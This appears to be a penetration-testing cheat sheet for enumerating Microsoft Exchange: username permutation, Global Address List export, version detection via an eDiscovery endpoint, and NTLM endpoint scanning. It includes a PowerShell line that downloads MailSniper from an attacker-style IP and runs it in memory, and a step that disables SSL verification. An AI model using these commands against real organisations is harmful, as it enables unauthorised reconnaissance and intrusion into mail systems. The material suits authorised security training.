# 17.01 Exchange Enumeration username-anarchy GAL export ntlmscan

> Enumerate Exchange via `username-anarchy`, GAL export (`global-address-list-owa`/`MailSniper`), version-detect on eDiscovery, and `ntlmscan`.

## Overview

Before attacking Exchange, enumerate usernames (from name lists via username-anarchy), export the Global Address List from Linux (global-address-list-owa script) or Windows (MailSniper), determine the Exchange version via the eDiscovery endpoint, and discover NTLM-enabled endpoints with ntlmscan and nmap.

## Steps

- Clone username-anarchy to generate all username format permutations from a names file
- Use --list-formats to pick a specific format; --input-file to process a names list
- Download and patch global-address-list-owa emailextract.py to disable SSL verification, then run with -i, -u, -p
- From Windows use MailSniper Get-GlobalAddressList with -ExchHostname, -Username, -Password, -OutFile
- Enumerate Exchange version via the eDiscovery exporttool endpoint with curl + xmllint
- Find NTLM endpoints with ntlmscan --host; confirm domain info with nmap http-ntlm-info script

## Commands

### Generate username list

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
```

### Export GAL from Linux

```bash
wget -q https://raw.githubusercontent.com/pigeonburger/global-address-list-owa/main/emailextract.py
```

### Exchange version enumeration

```bash
curl https://<TARGET>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version
```

### NTLM endpoint scan

```bash
git clone https://github.com/nyxgeek/ntlmscan
```

### MailSniper GAL export (Windows)

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.228:8000/MailSniper.ps1')
```
